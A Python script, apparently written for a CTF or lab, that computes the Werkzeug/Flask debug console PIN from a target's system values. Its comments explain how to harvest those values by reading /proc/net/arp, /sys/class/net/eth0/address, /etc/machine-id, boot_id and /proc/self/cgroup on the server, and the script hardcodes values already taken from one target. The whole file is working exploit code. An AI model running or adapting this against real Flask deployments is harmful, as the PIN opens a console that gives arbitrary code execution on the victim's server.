import hashlib
from itertools import chain
public = [
  'root', # USER app set in Dockerfile
  'flask.app', # this is standard
  'Flask', # this is standard
  '/usr/local/lib/python3.11/site-packages/flask/app.py' # play around locally on Docker to find this
]
private = [
  '2485377892354', # /proc/net/arp to get eth0 interface name, then /sys/class/net/eth0/address, convert MAC address to decimal
  'a3d50743-d72d-4b53-90d1-e9079fbbd2b1c3ce014792c7dea042128a41822a77efdca0ec1f142c5edaf16955c623866689'
  # Concatenates data from [ /etc/machine-id OR /proc/sys/kernel/random/boot_id ] with the first line of /proc/self/cgroup post the last slash (/) (on linux).
]

def generate_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv = None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    print(rv)

generate_pin(public, private)